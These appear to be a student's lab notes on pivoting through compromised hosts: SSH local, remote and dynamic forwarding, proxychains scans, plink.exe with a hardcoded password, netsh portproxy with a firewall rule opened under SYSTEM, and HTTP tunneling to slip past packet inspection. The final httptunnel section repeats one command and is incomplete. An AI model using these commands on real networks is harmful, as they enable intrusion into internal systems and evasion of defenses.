# Port Redirection and Tunneling 

1: Port Redirection
2: Tunneling 
3: Traffic Encapsulation 

# Port Forwarding : Redirect the traffic destinated from one ip address and port to another ip address and port 

Method 1;	
	Tool 1. RINETD : Use for Port Forwarding 
		edit the /etc/rinetd.conf file 
		and add four details 
		bindaddress bindport connectaddress connectport
	ex 	0.0.0.0 80 [ip-address of google] 80
		this rule will rediect all the traffic from port 80 to google 
	
Method 2 : 
	SSH Tunneling 	 
	ssh -N -L [bind_address]:port:host:hostport [username@address]

ex. 	ssh -N -L 0.0.0.0:445:192.168.0.1:445 student@10.11.0.12
	
	bind port on port 445 at local machine 
	to the port 445 on the window server 
	to the original linux target as student@10.11.0.12
	Before testing this, we need to make a minor change in our Samba configuration file to set the minimum SMB version to SMBv2 by adding “min protocol = SMB2” 
	
	Now we can enumerate the SMB shares on the third machine by executing command on a kali machine 
        command : smbclient -L 127.0.0.1 -U Administrator 

Method 3 : Remote port Forwarding 
	SSH Tunneling 
	ssh -N -R [bind_address:]port:host:hostport [username@address]
	
 ex.	ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
	it will redirect all the traffic comming to kali at port 2221 to windows machine at port 3306
	to scan this windows machine we can run a nmap scanner no local hosy at port 2221

Method 4 : SSH Dynamic Port Forwarding 
	Create a local SOCKS4 application proxy (-N -D) on our Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to any host in the target network,
	through the compromised Linux machine, which we log into as student (student@10.11.0.128):
 	
 	sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
	
	we need to edit the /etc/proxychains.conf
	then we can run nmap using proxychains 
	sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110


Windows Based Pivoting Systems : 

Tool 3 :  PLINK.exe : A windows based command line SSH Client to our target with our non interactive ftp file transfer method
	Note : Plink.exe is present in kali machine in /usr/share/windows-resources/binaries/plink.exe
	
	We can use plink.exe to connect via SSH (-ssh) to our Kali machine (10.11.0.4) as the kali user (-l kali) with a password of “ilak” (-pw ilak)
	to create a remote port forward (-R) of port 1234 (10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306) with the following command:
 	
	plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
	
	connect via : ssh 
	kali machine ip : 10.11.0.4
	-l : username of kali machine 
	-pw : password of kali machine 
	-R : remote_ip:port:local_machine:mysQL portnumber 
	
	The first time plink connects to a host, it will attempt to cache the host key in the registry 
	to Bypass this we need to prompt a new shell 
	command : 

	cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
	
	Now the all the incomming traffic to kali at port 1234 will be transfer to MySQL server 
	command : 
	nmap -sV -sV 127.0.0.1 -p 1234
	
	
Tool 4 : Netsh 
	Because of our privilege level, we do not have to deal with User Account Control (UAC), which means we can use the netsh595 utility (installed by default on every modern version of Windows) for port forwarding and pivoting.
	However, for this to work, the Windows system must have the IP Helper service running and IPv6 support must be enabled for the interface we want to use. 
	Fortunately, both are on and enabled by default on Windows operating systems.
		
	we will use the netsh (interface) context to add an IPv4-to-IPv4 (v4tov4) proxy (portproxy) listening on 10.11.0.22 (listenaddress=10.11.0.22), port 4455 (listenport=4455) that will forward to the Windows 2016 Server (connectaddress=192.168.1.110) on port 445 (connectport=445):
	command : 
	netsh interface portproxy add v4tov4 listenport=4455 listenaddres s=10.11.0.22 connectport=445 connectaddress=192.168.1.110

	The Windows Firewall will disallow inbound connections on TCP port 4455, which will prevent us from interacting with our tunnel.
	Given that we are running with SYSTEM privileges, we can easily remedy this by adding a firewall rule to allow inbound connections on that port.
	These netsh options are self-explanatory, but note that we allow (action=allow) specific inbound (dir=in) connections and leverage the firewall (advfirewall) context of netsh.	
	command :

	netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow 
	
	samba need to be configure as min protocol : SMB2
	
	smbclient -L 10.11.0.22 --port=4455 --user=Administrator
	
# HTTP Tunneling Through Deep Packet Inspection 
	
Tool 4 : httptunnel : Encapsulate all the traffic to http requests their by creating a http Tunnel 

	To do this, we will create a local forward (-L) from this machine (127.0.0.1) and will log in as student, using the new password we created post-exploitation. We will forward all requests on port 8888 (0.0.0.0:8888) to the Windows Server’s remote desktop port (192.168.1.110:3389):
	command : 
	ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
	
	setting up http tunnel at compromised machine 
	command : 
	ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
	
	Now setting up the http tunnel on kali linux : 
	command : 
	htc --forward-port 8080 10.11.0.28:1234
 
	